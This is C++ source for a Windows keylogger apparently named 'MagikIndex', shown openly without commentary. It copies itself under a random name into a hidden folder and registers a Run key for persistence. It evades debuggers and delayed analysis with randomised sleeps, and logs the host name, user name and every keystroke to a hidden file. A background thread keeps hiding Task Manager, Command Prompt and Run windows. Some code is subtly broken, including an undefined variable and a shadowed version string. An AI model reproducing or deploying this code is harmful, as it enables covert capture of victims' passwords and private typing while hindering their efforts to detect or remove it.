#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <wininet.h>
#include <iostream>
#include <string>
#include <fstream>
#include <VersionHelpers.h>

#define MAX_LENGTH 1024

#pragma comment(lib, "Wininet.lib")

FILE* OUTPUT_FILE;

BOOL RegisterMyProgramForStartup(PCSTR pszAppName, PCSTR pathToExe, PCSTR args)
{
    HKEY hKey = NULL;
    LONG lResult = 0;
    BOOL fSuccess = TRUE;
    DWORD dwSize;

    const size_t count = MAX_PATH * 2;
    char szValue[count] = {};


    strcpy_s(szValue, "\"");
    strcat_s(szValue, pathToExe);
    strcat_s(szValue, "\" ");

    if (args != NULL)
    {
        strcat_s(szValue, args);
    }

    lResult = RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);

    fSuccess = (lResult == 0);

    if (fSuccess)
    {
        dwSize = (strlen(szValue) + 1) * 2;
        lResult = RegSetValueExA(hKey, pszAppName, 0, REG_SZ, (BYTE*)szValue, dwSize);
        fSuccess = (lResult == 0);
    }

    if (hKey != NULL)
    {
        RegCloseKey(hKey);
        hKey = NULL;
    }

    return fSuccess;
}

void LogItInt(int key_stroke,std::string FileName) {
    if (key_stroke == 1 || key_stroke == 2) 
        return;
    if (key_stroke == VK_MBUTTON || key_stroke == VK_XBUTTON1 || key_stroke == VK_XBUTTON2 || key_stroke == 7)
        return;

    fopen_s(&OUTPUT_FILE,FileName.c_str(), "a+");

    std::cout << key_stroke << std::endl;

    if (key_stroke == 8)
        fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");
    else if (key_stroke == 13)
        fprintf(OUTPUT_FILE, "%s", "\n");
    else if (key_stroke == VK_SPACE)
        fprintf(OUTPUT_FILE, "%s", " ");
    else if (key_stroke == VK_LWIN)
        fprintf(OUTPUT_FILE, "%s", "[WIN]");
    else if (key_stroke == VK_TAB)
        fprintf(OUTPUT_FILE, "%s", "[TAB]");
    else if (key_stroke == VK_CAPITAL)
        fprintf(OUTPUT_FILE, "%s", "[CAPS LOCK]");
    else if (key_stroke == VK_SHIFT)
        fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
    else if (key_stroke == VK_CONTROL)
        fprintf(OUTPUT_FILE, "%s", "[CONTROL]");
    else if (key_stroke == VK_ESCAPE)
        fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
    else if (key_stroke == VK_END)
        fprintf(OUTPUT_FILE, "%s", "[END]");
    else if (key_stroke == VK_HOME)
        fprintf(OUTPUT_FILE, "%s", "[HOME]");
    else if (key_stroke == VK_DELETE)
        fprintf(OUTPUT_FILE, "%s", "[DELETE]");
    else if (key_stroke == VK_LEFT)
        fprintf(OUTPUT_FILE, "%s", "[LEFT]");
    else if (key_stroke == VK_UP)
        fprintf(OUTPUT_FILE, "%s", "[UP]");
    else if (key_stroke == VK_RIGHT)
        fprintf(OUTPUT_FILE, "%s", "[RIGHT]");
    else if (key_stroke == VK_DOWN)
        fprintf(OUTPUT_FILE, "%s", "[DOWN]");
    else if (key_stroke == 190 || key_stroke == 110)
        fprintf(OUTPUT_FILE, "%s", ".");
    else
        fprintf(OUTPUT_FILE, "%s", &key_stroke);
    fclose(OUTPUT_FILE);
}

void LogItChar(std::string Value, std::string FileName) {
#ifndef debug
    if (IsDebuggerPresent() && dbg != 0) {
        exit(0);
    }
#endif
    std::ofstream File;
    File.open(FileName, std::ios_base::app);
    File << Value;
    File << "\n";
    File.close();
}

ULONG WINAPI Protect(LPVOID);

ULONG WINAPI Protect(LPVOID Parameter) {

#ifndef debug
    if (IsDebuggerPresent()){
        exit(0);
    }
    while (1) {

        HWND Prog;
        Prog = FindWindowA(NULL, "Task Manager");
        ShowWindow(Prog, 0);
        Prog = FindWindowA(NULL, "Windows Task Manager");
        ShowWindow(Prog, 0);
        Prog = FindWindowA(NULL, "Command Prompt");
        ShowWindow(Prog, 0);
        Prog = FindWindowA(NULL, "C:\\Windows\\System32\\cmd.exe");
        ShowWindow(Prog, 0);
        Prog = FindWindowA(NULL, "Run");
        ShowWindow(Prog, 0);
        Sleep(200);
    }
#endif
    return 0;
}


void main()
{

    FreeConsole();

    CreateMutexA(0, FALSE, "Local\\$MagikIndex$");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        exit(0);
    }

    auto Tick = GetTickCount();

    srand(Tick * GetCurrentProcessId());

    int Time = 600000; int Divider = rand()%10000 + 100; int DividedSleep = Time/Divider;

#ifdef debug
    Divider = 0;
    AllocConsole();
#endif

    for (int j = 0; j <= Divider; j++) {
        Sleep(DividedSleep);
    }

    std::string TimeText = "Current Tick:";
    std::string ComputerText = "Host Name:";
    std::string UsernameText = "User Name:";
    std::string InternetText = "Internet Status:";
    std::string WidthText = "Screen Width:";
    std::string HeightText = "Screen Height:";
    std::string WindowsText = "Windows Version:";
    std::string OEMText = "OEM Number:";
    std::string CPUNumberText = "Number Of Cores:";
    std::string CPUTypeText = "CPU Type:";

    char* AppData = nullptr;
    size_t AppDataSize;
    _dupenv_s(&AppData, &AppDataSize, "APPDATA");

    char PathToFile[MAX_PATH];
    HMODULE GetModH = GetModuleHandle(NULL);
    GetModuleFileNameA(GetModH, PathToFile, sizeof(PathToFile));

    std::string LogTime = std::to_string(Tick);

    std::string CurrentLog = AppData;
    CurrentLog += "\\MagikIndex";

    CreateDirectoryA(CurrentLog.c_str(),NULL);

    SetFileAttributesA(CurrentLog.c_str(), FILE_ATTRIBUTE_HIDDEN);

    CurrentLog += "\\Log";
    CurrentLog += LogTime;
    CurrentLog += ".txt";

    DWORD Size = MAX_LENGTH+1;

    char HostName[MAX_LENGTH+1];

    char UserName[MAX_LENGTH+1];

    BOOL InternetStatus = InternetCheckConnectionA("https://www.google.com", FLAG_ICC_FORCE_CONNECTION, 0);
    std::string InternetStatusString = std::to_string(InternetStatus);

    GetComputerNameA(HostName,&Size);

    GetUserNameA(UserName,&Size);

    std::string DestinationFile = "C:\\Users\\";
    DestinationFile += UserName;
    DestinationFile += "\\Music\\MagikIndex";

    CreateDirectoryA(DestinationFile.c_str(), NULL);

    SetFileAttributesA(DestinationFile.c_str(), FILE_ATTRIBUTE_HIDDEN);

    DestinationFile += "\\";

    char CharacterSet[62] = { 'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','1','2','3','4','5','6','7','8','9','0' };
    for (int i = 0; i < 15; i++) {
        DestinationFile += CharacterSet[rand() % 61 + 0];
    }

    DestinationFile += ".exe";

    CopyFileA(PathToFile,DestinationFile.c_str(),false);

    RegisterMyProgramForStartup("MagikIndex", DestinationFile.c_str(), "");


    int x1, y1, x2, y2, w, h;

    x1 = GetSystemMetrics(SM_XVIRTUALSCREEN);
    y1 = GetSystemMetrics(SM_YVIRTUALSCREEN);
    x2 = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    y2 = GetSystemMetrics(SM_CYVIRTUALSCREEN);
    w = x2 - x1;
    h = y2 - y1;
    std::string Width = std::to_string(w);

    std::string Height = std::to_string(h);

    std::string WindowsVersion = "Unknown";

    if (IsWindows7OrGreater())
    {
        std::string WindowsVersion = "Seven";
    }

    if (IsWindows7SP1OrGreater())
    {
        std::string WindowsVersion = "Seven SP1";
    }

    if (IsWindows8OrGreater())
    {
        std::string WindowsVersion = "Eight";
    }

    if (IsWindows8Point1OrGreater())
    {
        std::string WindowsVersion = "Eight.one";
    }

    if (IsWindows10OrGreater())
    {
        std::string WindowsVersion = "Ten";
    }

    if (IsWindowsServer())
    {
        std::string WindowsVersion = "Server";
    }

    SYSTEM_INFO siSysInfo;
    GetSystemInfo(&siSysInfo);
    std::string OEMNumber = std::to_string(siSysInfo.dwOemId);
    std::string CPUCores = std::to_string(siSysInfo.dwNumberOfProcessors);
    std::string CPUType = std::to_string(siSysInfo.dwProcessorType);

    TimeText += LogTime;
    LogItChar(TimeText, CurrentLog);

    ComputerText += HostName;
    LogItChar(ComputerText, CurrentLog);

    UsernameText += UserName;
    LogItChar(UsernameText, CurrentLog);

    InternetText += InternetStatusString;
    LogItChar(InternetText, CurrentLog);

    WidthText += Width;
    LogItChar(WidthText, CurrentLog);

    HeightText += Height;
    LogItChar(HeightText, CurrentLog);

    WindowsText += WindowsVersion;
    LogItChar(WindowsText, CurrentLog);

    OEMText += OEMNumber;
    LogItChar(OEMText,CurrentLog);

    CPUNumberText += CPUCores;
    LogItChar(CPUNumberText, CurrentLog);

    CPUTypeText += CPUType;
    LogItChar(CPUTypeText, CurrentLog);


    LogItChar("------------------------------------------\n",CurrentLog);

    SetFileAttributesA(CurrentLog.c_str(), FILE_ATTRIBUTE_HIDDEN);

    unsigned long ThreadId;
    CreateThread(NULL, 0, Protect, 0, 0, &ThreadId);

    while (1) {

        int ArraySize = 10;

        int KeyList = {};


        while (1) {
            Sleep(50);
            for (int i = 8; i < 190; i++) {
                if (GetAsyncKeyState(i) == -32767) {
                    LogItInt(i, CurrentLog);
                }
            }
        }
    }
}
